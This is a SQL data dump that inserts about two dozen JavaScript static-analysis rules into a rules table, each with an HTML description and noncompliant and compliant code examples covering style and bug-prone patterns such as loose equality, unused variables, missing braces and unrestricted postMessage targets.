INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1169, 'Loop counters should not be assigned to from within the loop body', 'S2310', NULL, 'javascript', '<p>Loop counters should not be modified in the body of the loop. However other loop control variables representing logical values may be modified in the loop, for example a flag to indicate that something has been completed, which is then tested in the for statement.</p>

<h2>Noncompliant Code Example</h2>
<pre>
var names = [ "Jack", "Jim", "", "John" ];
for (var i = 0; i &lt; names.length; i++) {
  if (!names[i]) {
    i = names.length;                                 // Non-Compliant
  } else {
    console.log(names[i]);
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
var names = [ "Jack", "Jim", "", "John" ];
for (var name of names) {
  if (!name) {
    break;                                 // Compliant
  } else {
    console.log(name);
  }
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813293, 1510817813293, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1170, 'Comparison operators should not be used with strings', 'S3003', NULL, 'javascript', '<p>The use of comparison operators (<code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>&gt;</code>) with strings is not likely to yield the expected results. Instead, try converting at least one operand to the <code>number</code> type.</p>

<h2>Noncompliant Code Example</h2>
<pre>
var appleNumber = "123";
var orangeNumber = "45";
if (appleNumber &lt; orangeNumber) {  // Noncompliant, this condition is true
  alert("There are more oranges");
}
</pre>

<h2>Compliant Solution</h2>
<pre>
var appleNumber = "123";
var orangeNumber = "45";
if (Number(appleNumber) &lt; Number(orangeNumber)) {
  alert("There are more oranges");
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'suspicious', false, 'HTML', 1510817813294, 1510817813294, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1171, 'Expressions should not be too complex', 'S1067', NULL, 'javascript', '<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code> operators it contains.</p>
<p>A single expression''s complexity should not become too high to keep the code readable.</p>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'LINEAR_OFFSET', NULL, '1min', NULL, '5min', 'per complexity point above the threshold', NULL, 'brain-overload', false, 'HTML', 1510817813295, 1510817813295, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1172, 'Unary operators "+" and "-" should not be used with objects', 'S3002', NULL, 'javascript', '<p>
  The unary operators <code>+</code> and <code>-</code> can be used to convert some value types to numeric values.
  But not every value can be converted to a <code>Number</code> type: use it with an object, and result will be always <code>NaN</code> (Not A Number).
</p>

<h2>Noncompliant Code Example</h2>

<pre>
var obj = {x : 1};
doSomethingWithNumber(+obj);    // Noncompliant

function foo(){
  return 1;
}
doSomethingWithNumber(-foo);    // Noncompliant
</pre>

<h2>Compliant Solution</h2>

<pre>
var obj = {x : 1};
doSomethingWithNumber(+obj.x);

function foo(){
  return 1;
}
doSomethingWithNumber(-foo());

var str = ''42'';
doSomethingWithNumber(+str);
</pre>

<h2>Exceptions</h2>

<p>Unary <code>+</code> and <code>-</code> can be used with objects corresponding to primitive types.</p>

<pre>
var b = new Boolean(true);
doSomethingWithNumber(-b);  // Compliant
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817813297, 1510817813297, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1173, 'Array and Object constructors should not be used', 'ArrayAndObjectConstructors', NULL, 'javascript', '<p>
  Array and Object literals should always be preferred to Array and Object constructors.
</p>

<p>
  Array constructors are error-prone due to the way their arguments are interpreted. If more than one argument is used, the array length will be equal to the number of arguments. However, using a single argument will have one of three consequences:
</p>

<ul>
    <li>If the argument is a number and it is a natural number the length will be equal to the value of the argument.</li>
    <li>If the argument is a number, but not a natural number an exception will be thrown.</li>
    <li>Otherwise the array will have one element with the argument as its value.</li>
</ul>

<p>
  For these reasons, if someone changes the code to pass 1 argument instead of 2 arguments, the array might not have the expected length. To avoid these kinds of weird cases, always use the more readable array.
</p>

<p>
  Object constructors don''t have the same problems, but for readability and consistency object literals should be used.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var a3 = new Array(x1); // Noncompliant and variable in results
var a4 = new Array();  // Noncompliant. Results in 0-element array.
var a1 = new Array(x1, x2, x3);  // Noncompliant. Results in 3-element array.

var o = new Object(); // Noncompliant

var o2 = new Object(); // Noncompliant
o2.a = 0;
o2.b = 1;
o2.c = 2;
o2[''strange key''] = 3;
</pre>

<h2>Compliant Solution</h2>
<pre>
var a = [x1, x2, x3];
var a2 = [x1, x2];
var a3 = [x1];
var a4 = [];

var o = {};

var o2 = {
  a: 0,
  b: 1,
  c: 2,
  ''strange key'': 3
};
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813298, 1510817813298, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1174, 'Functions should not have too many parameters', 'ExcessiveParameterList', NULL, 'javascript', '<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many things.</p>

<h2>Noncompliant Code Example</h2>
The following code snippet illustrates this rule with a maximum number of 4 parameters:
<pre>
function doSomething(param1, param2, param3, param4, param5) { 
...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public void doSomething(int param1, int param2, int param3, String param4) {
...
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817813299, 1510817813299, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1175, 'Setters should not return values', 'S2432', NULL, 'javascript', 'Functions declared with the <code>set</code> keyword will automatically return the values they were passed. Thus any value explicitly returned from a setter will be ignored, and explicitly returning a value is an error.

<h2>Noncompliant Code Example</h2>
<pre>
var person = {
  // ...
  set name(name) {
    this.name = name;
    return 42;  // Noncompliant
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
var person = {
  // ...
  set name(name) {
    this.name = name;
  }
}
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813300, 1510817813301, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1176, 'Braces and parentheses should be used consistently with arrow functions', 'S3524', NULL, 'javascript', '<p>Shared coding conventions allow teams to collaborate effectively. This rule raises an issue when the use of parentheses with an arrow function does not conform to the configured requirements.</p>

<h2>Noncompliant Code Example</h2>
<p>With the configured defaults forbidding parentheses</p>
<pre>
var foo = (a) =&gt; { /* ... */ };  // Noncompliant; remove parens from arg
var bar = (a, b) =&gt; { return 0; };  // Noncompliant; remove curly braces from body
</pre>

<h2>Compliant Solution</h2>
<pre>
var foo = a =&gt; { /* ... */ };
var bar = (a, b) =&gt; 0;
</pre>', 0, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention,es2015', false, 'HTML', 1510817813301, 1510817813302, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1177, '"continue" should not be used', 'ContinueStatement', NULL, 'javascript', '<p><code>continue</code> is an unstructured control flow statement. It makes code less testable, less readable and less maintainable. Structured control flow statements such as <code>if</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>

<pre>
  for (i = 0; i < 10; i++) {
    if (i == 5) {
      continue;  /* Non-Compliant */
    }
    alert("i = " + i);
  }
</pre>
<h2>Compliant Solution</h2>

<pre>
  for (i = 0; i < 10; i++) {
    if (i != 5) {  /* Compliant */
      alert("i = " + i);
    }
  }
</pre>
<h2>See</h2>

<ul>
<li> MISRA C:2004, 14.5</li>
</ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'misra', false, 'HTML', 1510817813304, 1510817813304, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1178, 'The identity operator ("===") should not be used with dissimilar types', 'S3403', NULL, 'javascript', '<p>Comparing dissimilar types using the identity operator (<code>===</code>) will always return <code>false</code> because no type conversion is done before the comparison. Thus, such comparisons can only be bugs.</p>

<h2>Noncompliant Code Example</h2>
<pre>
var a = 8;
var b = "8";

if (a === b) {  // Noncompliant; always false
  // ...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
var a = 8;
var b = "8";

if (a == b) {
  // ...
}
</pre>
<p>or</p>
<pre>
var a = 8;
var b = "8";

if (a === Number(b)) {
  // ...
}
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813305, 1510817813305, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1179, 'Related "if/else if" statements and "cases" in a "switch" should not have the same condition', 'S1862', NULL, 'javascript', '<p>
  A <code>switch</code> and a chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first one with a condition that evaluates to <code>true</code>.
</p>
<p>
  Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it''s simply dead code and at worst, it''s a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior.
</p>

<p>
For a <code>switch</code>, if the first case ends with a break, the second case will never be executed, rendering it dead code. Worse there is the risk in this situation that future maintenance will be done on the dead case, rather than on the one that''s actually used.
</p>

<p>
On the other hand, if the first case does not end with a break, both cases will be executed, but future maintainers may not notice that.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 1)  // Noncompliant
  moveWindowToTheBackground();

switch(i) {
  case 1:
    //...
    break;
  case 3:
    //...
    break;
  case 1:  // Noncompliant
    //...
    break;
  default:
    // ...
    break;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 3)
  moveWindowToTheBackground();

switch(i) {
  case 1:
    //...
    break;
  case 3:
    //...
    break;
  default:
    // ...
    break;
}
</pre>

<h2>See</h2>
  <ul>
    <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect </li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a>- Detect and remove code that has no effect </li>
  </ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,pitfall,unused', false, 'HTML', 1510817813306, 1510817813306, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1180, 'Strings and non-strings should not be added', 'S3402', NULL, 'javascript', '<p>Use a <code>+</code> with two numbers and you''ll get addition. But use it with a string and anything else, and you''ll get concatenation. Very often that''s not what''s intended, and even when it is, it''s likely to confuse future maintainers. </p>
<p>Since this may not be what''s intended, this rule raises an issue when <code>+</code> is used with a string and a non-string.</p>

<h2>Noncompliant Code Example</h2>
<pre>
var a = ''42'';
var b = 5;
var sum = a + b;          // Noncompliant; yields string "425"

var foo = '' is a lucky number'';
alert(42 + foo);          // Noncompliant; make your intention explicit
</pre>

<h2>Compliant Solution</h2>
<pre>
var a = ''42'';
var b = 5;
var sum = parseInt(a) + b; // Compliant; yields 47

var foo = '' is a lucky number'';
alert('''' + 42 + foo);     // Use an empty string literal
alert(`${42}${foo}`);     // Use template strings; available since ES2015
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'suspicious', false, 'HTML', 1510817813307, 1510817813307, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1181, 'Unused local variables should be removed', 'UnusedVariable', NULL, 'javascript', '<p>
  If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will not wonder what the variable is used for.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
function numberOfMinutes(hours) {
  var seconds = 0;   // seconds is never used
  return hours * 60;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
function numberOfMinutes(hours) {
  return hours * 60;
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'unused', false, 'HTML', 1510817813308, 1510817813308, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1182, 'Control structures should always use curly braces', 'CurlyBraces', NULL, 'javascript', '<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>

<pre>
// the two statements seems to be attached to the if statement, but that is only true for the first one:
if (condition)
  executeSomething();
  checkSomething();
</pre>
<h2>Compliant Solution</h2>

<pre>
if (condition) {
  executeSomething();
  checkSomething();
}
</pre>
<h2>See</h2>

<ul>
<li> MISRA C:2004, 14.8 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement</li>
<li> MISRA C:2004, 14.9 - An if (expression) construct shall be followed by a compound statement. The else keyword shall be followed by either a compound statement, or another if statement</li>
<li> MISRA C++:2008, 6-3-1 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement</li>
<li> MISRA C++:2008, 6-4-1 - An if (condition) construct shall be followed by a compound statement. The else keyword shall be followed by either a compound statement, or another if statement</li>
<li> MISRA C:2012, 15.6 - The body of an iteration-statement or a selection-statement shall be a compound-statement</li>
<li> <a href="https://www.securecoding.cert.org/confluence/x/1QGMAg">CERT, EXP19-C</a> - Use braces for the body of an if, for, or while statement</li>
<li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation</li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,cwe,misra,pitfall', false, 'HTML', 1510817813309, 1510817813309, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1183, 'Cross-document messaging domains should be carefully restricted', 'S2819', NULL, 'javascript', '<p>
  HTML5 adds the ability to send messages to documents served from other domains. To mitigate the risk of sending sensitive information to a document served from a hostile or
  unknown domain, this rule raises an issue each time <code>Window.postMessage</code> is used.
</p>

<h2>Noncompliant Code Example</h2>

<pre>
var myWindow = document.getElementById(''myIFrame'').contentWindow;
myWindow.postMessage(message, "*"); // Noncompliant; how do you know what you loaded in ''myIFrame'' is still there?
</pre>

<h2>See</h2>
<ul>
  <li><a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)">OWASP Top Ten 2013 Category A3</a> - Cross-Site Scripting (XSS)</li>
</ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'html5,owasp-a3', false, 'HTML', 1510817813310, 1510817813310, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1186, 'Dead Stores should be removed', 'S1854', NULL, 'javascript', '<p>
  A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value only to then overwrite it or
  throw it away, could indicate a serious error in the code. Even if it''s not an error, it is at best a waste of resources. Therefore all calculated values should be used.
</p>

<h2>Noncompliant Code Example</h2>

<pre>
function pow(a, b) {
  if(b == 0) {
    return 0;
  }
  var x = a;
  for(var i = 1, i < b, i++) {
    x = x * a;  //Dead store because the last return statement should return x instead of returning a
  }
  return a;
}
</pre>

<h2>Compliant Solution</h2>

<pre>
function pow(a, b) {
  if(b == 0) {
    return 0;
  }
  var x = a;
  for(var i = 1, i < b, i++) {
    x = x * a;
  }
  return x;
}
</pre>

<h2>See</h2>
<ul>
  <li><a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use (''Unused Variable'')</li>
  <li><a href="https://www.securecoding.cert.org/confluence/x/QYA5">CERT, MSC13-C</a> - Detect and remove unused values</li>
  <li><a href="https://www.securecoding.cert.org/confluence/x/S4IyAQ">CERT, MSC13-CPP</a> - Detect and remove unused values</li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,cwe,unused', false, 'HTML', 1510817813313, 1510817813313, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1187, 'Destructuring syntax should be used for assignments', 'S3514', NULL, 'javascript', '<p>ECMAScript 2015 introduced the ability to extract and assign multiple data points from an object or array simultaneously. This is called "destructuring", and it allows you to condense boilerplate code so you can concentrate on logic. </p>
<p>This rule raises an issue when multiple pieces of data are extracted out of the same object or array and assigned to variables.</p>

<h2>Noncompliant Code Example</h2>
<pre>
function foo (obj1, obj2, array) {
  var a = obj1.a;  // Noncompliant
  var b = obj1.b;

  var name = obj2.name;  // ignored; there''s only one extraction-and-assignment

  var zero = array[0];  // Noncompliant
  var one = array[1];
}
</pre>

<h2>Compliant Solution</h2>
<pre>
function foo (obj1, obj2, array) {
  var {a, b} = obj1;

  var {name} = obj2;  // this syntax works because var name and property name are the same

  var [zero, one] = array;
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy,es2015', false, 'HTML', 1510817813314, 1510817813314, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1188, 'The "changed" property should not be manipulated directly', 'S2549', NULL, 'javascript', '<p>According to the Backbone.js docs</p>

<blockquote>
  The <strong>changed</strong> property is the internal hash containing all the attributes that have changed since the last set. Please do not update <strong>changed</strong> directly since its state is
  internally maintained by set. A copy of <strong>changed</strong> can be acquired from changedAttributes.
</blockquote>

<p>
  The <code>changed</code> property is involved in decisions about whether or not a collection should be resorted when it is updated.
  If you modify it manually, you can break the resorting of the collection.
</p>

<h2>Noncompliant Code Example</h2>

<pre>
myModel.changed = { myProperty: 1 }; // Non-compliant
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'backbone', false, 'HTML', 1510817813315, 1510817813315, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1189, 'HTML-style comments should not be used', 'HtmlComments', NULL, 'javascript', '<p>
  HTML-style comments are not part of EcmaScript specification, and should not be used.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
&lt;!-- Noncompliant -->
</pre>

<h2>Compliant Solution</h2>
<pre>
// Compliant
/* Compliant */
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813316, 1510817813316, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1190, 'Variables should be declared explicitly', 'S2703', NULL, 'javascript', '<p>JavaScript variable scope can be particularly difficult to understand and get right. The situation gets even worse when you consider the <em>accidental</em> creation of global
  variables, which is what happens when you declare a variable inside a function or the <code>for</code> clause of a for-loop without using the <code>let</code>,
  <code>const</code> or <code>var</code> keywords. </p>

<p><code>let</code> and <code>const</code> were introduced in ECMAScript 2015, and are now the preferred keywords for variable declaration.</p>

<h2>Noncompliant Code Example</h2>
<pre>
function f(){
  i = 1;         // Noncompliant; i is global

  for (j = 0; j &lt; array.length; j++) {  // Noncompliant; j is global now too
    // ...
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
function f(){
  var i = 1;

  for (let j = 0; j &lt; array.length; j++) {
    // ...
  }
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813317, 1510817813317, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1191, '"===" and "!==" should be used instead of "==" and "!="', 'EqEqEq', NULL, 'javascript', '<p>The <code>==</code> and <code>!=</code> operators do type coercion before comparing values. This is bad because it can mask type errors. For example, it evaluates <code>'' \t\r\n'' == 0</code> as <code>true</code>.</p>
<p>It is best to always use the side-effect-less <code>===</code> and <code>!==</code> operators instead.</p>
<h2>Noncompliant Code Example</h2>

<pre>
if (var == ''howdy'') {...} // Noncompliant
</pre>
<h2>Compliant Solution</h2>

<pre>
if (var === ''howdy'') {...}
</pre>
<h2>Exceptions</h2>

<p>Even if testing the equality of a variable against null doesn''t do exactly what most JavaScript developers believe, usage of <code>==</code> or <code>!=</code> is tolerated in such context. In the following case, if <code>foo</code> hasn''t been initialized, its default value is not <code>null</code> but <code>undefined</code>. Nevertheless <code>undefined == null</code>, so JavaScript developers get the expected behavior.</p>
<pre>
if(foo == null) {...}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813318, 1510817813318, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1192, 'The base should be provided to "parseInt"', 'S2427', NULL, 'javascript', '<p>The <code>parseInt</code> function has two versions, one that takes a base value as a second argument and one that does not, and using the single-arg version can result in unexpected results on older browsers. </p>
<h2>Noncompliant Code Example</h2>

<pre>
parseInt("010");  // Noncompliant; pre-2013 browsers may return 8 
</pre>
<h2>Compliant Solution</h2>

<pre>
parseInt("010", 10);
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817813319, 1510817813319, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1193, 'Nested blocks of code should not be left empty', 'EmptyBlock', NULL, 'javascript', '<p>
  Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
for (var i = 0; i < length; i++) {}  // Empty on purpose or missing piece of code ?
</pre>

<h2>Exceptions</h2>
<p>
  When a block contains a comment, this block is not considered to be empty.
</p>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813320, 1510817813320, 2);
